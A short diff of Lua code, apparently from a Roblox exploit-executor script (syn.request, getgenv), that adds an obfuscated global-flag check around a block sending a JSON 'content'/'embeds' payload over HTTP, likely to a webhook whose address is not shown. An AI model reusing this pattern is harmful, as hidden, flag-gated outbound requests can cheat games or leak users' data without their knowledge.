@@ -1,4 +1,5 @@
-                    if getgenv().xw0DLBPTqZkzEWOXx6qCScoNKSoBhGh or getgenv().UtlpHuOwhroliTt4DRSwzv4qdQYuK9M == true then
+                if getgenv().xw0DLBPTqZkzEWOXx6qCScoNKSoBhGh or getgenv().UtlpHuOwhroliTt4DRSwzv4qdQYuK9M == true then
+                    if getgenv().aPePZhyhv3J1HCY0MdZdlTByaFm7aehjH68UG8YK ~= true then
                         
                         local http_request = syn and syn.request or request
 
@@ -104,3 +105,4 @@
                             Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {a}})
                         }
                     end
+                end
